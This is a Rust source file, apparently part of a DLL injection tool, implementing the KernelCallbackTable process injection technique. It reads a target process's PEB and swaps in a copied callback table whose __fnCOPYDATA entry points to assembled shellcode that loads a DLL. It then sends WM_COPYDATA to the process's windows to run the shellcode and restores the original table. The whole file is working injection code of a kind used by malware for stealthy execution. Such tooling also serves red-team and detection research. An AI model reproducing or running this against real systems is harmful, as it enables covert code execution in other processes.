use std::ffi::c_void;

use windows::{Wdk::System::Threading::ProcessBasicInformation, Win32::{Foundation::{LPARAM, WPARAM}, System::{DataExchange::COPYDATASTRUCT, Threading::PROCESS_BASIC_INFORMATION}, UI::WindowsAndMessaging::WM_COPYDATA}};
use dynasmrt::{dynasm, DynasmApi};
use crate::{utils::to_wide, wrappers::{AllocatedMemory, HandleWrapper as _, RemoteAllocator as _, RemoteProcess}};

use super::ExecutionMethod;

#[repr(C)]
pub struct PebPartial {
    _reserved: [u8; 0x58], // 88 bytes of padding
    pub kernel_callback_table: *mut c_void,
}

#[repr(C)]
#[derive(Debug, Clone, Copy)]
#[allow(non_snake_case)]
pub struct KernelCallbackTable {
    pub __fnCOPYDATA: usize,
    pub __fnCOPYGLOBALDATA: usize,
    pub __fnDWORD: usize,
    pub __fnNCDESTROY: usize,
    pub __fnDWORDOPTINLPMSG: usize,
    pub __fnINOUTDRAG: usize,
    pub __fnGETTEXTLENGTHS: usize,
    pub __fnINCNTOUTSTRING: usize,
    pub __fnPOUTLPINT: usize,
    pub __fnINLPCOMPAREITEMSTRUCT: usize,
    pub __fnINLPCREATESTRUCT: usize,
    pub __fnINLPDELETEITEMSTRUCT: usize,
    pub __fnINLPDRAWITEMSTRUCT: usize,
    pub __fnPOPTINLPUINT: usize,
    pub __fnPOPTINLPUINT2: usize,
    pub __fnINLPMDICREATESTRUCT: usize,
    pub __fnINOUTLPMEASUREITEMSTRUCT: usize,
    pub __fnINLPWINDOWPOS: usize,
    pub __fnINOUTLPPOINT5: usize,
    pub __fnINOUTLPSCROLLINFO: usize,
    pub __fnINOUTLPRECT: usize,
    pub __fnINOUTNCCALCSIZE: usize,
    pub __fnINOUTLPPOINT5_: usize,
    pub __fnINPAINTCLIPBRD: usize,
    pub __fnINSIZECLIPBRD: usize,
    pub __fnINDESTROYCLIPBRD: usize,
    pub __fnINSTRING: usize,
    pub __fnINSTRINGNULL: usize,
    pub __fnINDEVICECHANGE: usize,
    pub __fnPOWERBROADCAST: usize,
    pub __fnINLPUAHDRAWMENU: usize,
    pub __fnOPTOUTLPDWORDOPTOUTLPDWORD: usize,
    pub __fnOPTOUTLPDWORDOPTOUTLPDWORD_: usize,
    pub __fnOUTDWORDINDWORD: usize,
    pub __fnOUTLPRECT: usize,
    pub __fnOUTSTRING: usize,
    pub __fnPOPTINLPUINT3: usize,
    pub __fnPOUTLPINT2: usize,
    pub __fnSENTDDEMSG: usize,
    pub __fnINOUTSTYLECHANGE: usize,
    pub __fnHkINDWORD: usize,
    pub __fnHkINLPCBTACTIVATESTRUCT: usize,
    pub __fnHkINLPCBTCREATESTRUCT: usize,
    pub __fnHkINLPDEBUGHOOKSTRUCT: usize,
    pub __fnHkINLPMOUSEHOOKSTRUCTEX: usize,
    pub __fnHkINLPKBDLLHOOKSTRUCT: usize,
    pub __fnHkINLPMSLLHOOKSTRUCT: usize,
    pub __fnHkINLPMSG: usize,
    pub __fnHkINLPRECT: usize,
    pub __fnHkOPTINLPEVENTMSG: usize,
    pub __xxxClientCallDelegateThread: usize,
    pub __ClientCallDummyCallback: usize,
    pub __fnKEYBOARDCORRECTIONCALLOUT: usize,
    pub __fnOUTLPCOMBOBOXINFO: usize,
    pub __fnINLPCOMPAREITEMSTRUCT2: usize,
    pub __xxxClientCallDevCallbackCapture: usize,
    pub __xxxClientCallDitThread: usize,
    pub __xxxClientEnableMMCSS: usize,
    pub __xxxClientUpdateDpi: usize,
    pub __xxxClientExpandStringW: usize,
    pub __ClientCopyDDEIn1: usize,
    pub __ClientCopyDDEIn2: usize,
    pub __ClientCopyDDEOut1: usize,
    pub __ClientCopyDDEOut2: usize,
    pub __ClientCopyImage: usize,
    pub __ClientEventCallback: usize,
    pub __ClientFindMnemChar: usize,
    pub __ClientFreeDDEHandle: usize,
    pub __ClientFreeLibrary: usize,
    pub __ClientGetCharsetInfo: usize,
    pub __ClientGetDDEFlags: usize,
    pub __ClientGetDDEHookData: usize,
    pub __ClientGetListboxString: usize,
    pub __ClientGetMessageMPH: usize,
    pub __ClientLoadImage: usize,
    pub __ClientLoadLibrary: usize,
    pub __ClientLoadMenu: usize,
    pub __ClientLoadLocalT1Fonts: usize,
    pub __ClientPSMTextOut: usize,
    pub __ClientLpkDrawTextEx: usize,
    pub __ClientExtTextOutW: usize,
    pub __ClientGetTextExtentPointW: usize,
    pub __ClientCharToWchar: usize,
    pub __ClientAddFontResourceW: usize,
    pub __ClientThreadSetup: usize,
    pub __ClientDeliverUserApc: usize,
    pub __ClientNoMemoryPopup: usize,
    pub __ClientMonitorEnumProc: usize,
    pub __ClientCallWinEventProc: usize,
    pub __ClientWaitMessageExMPH: usize,
    pub __ClientWOWGetProcModule: usize,
    pub __ClientWOWTask16SchedNotify: usize,
    pub __ClientImmLoadLayout: usize,
    pub __ClientImmProcessKey: usize,
    pub __fnIMECONTROL: usize,
    pub __fnINWPARAMDBCSCHAR: usize,
    pub __fnGETTEXTLENGTHS2: usize,
    pub __fnINLPKDRAWSWITCHWND: usize,
    pub __ClientLoadStringW: usize,
    pub __ClientLoadOLE: usize,
    pub __ClientRegisterDragDrop: usize,
    pub __ClientRevokeDragDrop: usize,
    pub __fnINOUTMENUGETOBJECT: usize,
    pub __ClientPrinterThunk: usize,
    pub __fnOUTLPCOMBOBOXINFO2: usize,
    pub __fnOUTLPSCROLLBARINFO: usize,
    pub __fnINLPUAHDRAWMENU2: usize,
    pub __fnINLPUAHDRAWMENUITEM: usize,
    pub __fnINLPUAHDRAWMENU3: usize,
    pub __fnINOUTLPUAHMEASUREMENUITEM: usize,
    pub __fnINLPUAHDRAWMENU4: usize,
    pub __fnOUTLPTITLEBARINFOEX: usize,
    pub __fnTOUCH: usize,
    pub __fnGESTURE: usize,
    pub __fnPOPTINLPUINT4: usize,
    pub __fnPOPTINLPUINT5: usize,
    pub __xxxClientCallDefaultInputHandler: usize,
    pub __fnEMPTY: usize,
    pub __ClientRimDevCallback: usize,
    pub __xxxClientCallMinTouchHitTestingCallback: usize,
    pub __ClientCallLocalMouseHooks: usize,
    pub __xxxClientBroadcastThemeChange: usize,
    pub __xxxClientCallDevCallbackSimple: usize,
    pub __xxxClientAllocWindowClassExtraBytes: usize,
    pub __xxxClientFreeWindowClassExtraBytes: usize,
    pub __fnGETWINDOWDATA: usize,
    pub __fnINOUTSTYLECHANGE2: usize,
    pub __fnHkINLPMOUSEHOOKSTRUCTEX2: usize,
}

pub struct KernelCallbackTableExecutor;

impl ExecutionMethod for KernelCallbackTableExecutor {
    fn execute(
        remote_process: &RemoteProcess,
        inject_func_addr: usize,
        dll_path_mem_alloc: &AllocatedMemory,
    ) -> Result<(), Box<dyn std::error::Error>> {
        let pbi = remote_process.query_info::<PROCESS_BASIC_INFORMATION>(ProcessBasicInformation)?;

        println!("PEB address: {:?}", pbi.PebBaseAddress);
        let mut peb: PebPartial = unsafe {
            remote_process.read_struct(pbi.PebBaseAddress as *const c_void)?
        };

        println!("KernelCallbackTable address: {:?}", peb.kernel_callback_table);

        let kct_addr = peb.kernel_callback_table;
        let mut kct: KernelCallbackTable = unsafe {
            remote_process.read_struct(peb.kernel_callback_table)?
        };

        println!("KernelCallbackTable: {kct:?}");

        let stub = build_shcode(
            dll_path_mem_alloc.as_ptr() as u64,
            inject_func_addr as u64,
        )?;
        let shellcode_alloc = remote_process.alloc(stub.len(), true)?;
        shellcode_alloc.write(&stub)?;

        kct.__fnCOPYDATA = shellcode_alloc.as_ptr() as usize;
        let newkct_alloc = remote_process.alloc(std::mem::size_of::<KernelCallbackTable>(), true)?;
        newkct_alloc.write_struct(&kct)?;

        peb.kernel_callback_table = newkct_alloc.as_ptr();
        unsafe {
            remote_process.write_struct(pbi.PebBaseAddress as *mut c_void, &peb)?
        };

        println!("Triggering shellcode via WM_COPYDATA");

        let windows = remote_process.get_windows()?;
        let msg = to_wide("Pwn"); // todo: probably can be empty
        let cds = COPYDATASTRUCT {
            dwData: 1,
            cbData: (msg.len() * 2) as u32,
            lpData: msg.as_ptr() as *mut c_void,
        };

        println!("Sending WM_COPYDATA to {} windows", windows.len());

        for window in &windows {
            window.send_msg(WM_COPYDATA, Some(WPARAM(window.handle().0 as usize)), Some(LPARAM(&cds as *const _ as isize)));
            std::thread::sleep(std::time::Duration::from_millis(10));
        }

        println!("Restoring previous __fnCOPYDATA");

        peb.kernel_callback_table = kct_addr;
        unsafe {
            remote_process.write_struct(pbi.PebBaseAddress as *mut c_void, &peb)?
        };

        println!("Restored previous __fnCOPYDATA");

        Ok(())
    }
}

fn build_shcode(
    dll_path_ptr: u64,
    inject_func_ptr: u64,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut ops: dynasmrt::Assembler<dynasmrt::x64::X64Relocation> = dynasmrt::x64::Assembler::new()?;

    dynasm!(ops
        ; .arch x64
        ; sub rsp, 0x28

        ; mov rcx, QWORD dll_path_ptr as i64  // inject
        ; mov rax, QWORD inject_func_ptr as i64
        ; call rax

        ; add rsp, 0x28

        ; ret
    );

    let buf = ops.finalize().unwrap();
    println!("{:#04X?}, length: {}", buf.to_vec(), buf.to_vec().len());
    Ok(buf.to_vec())
}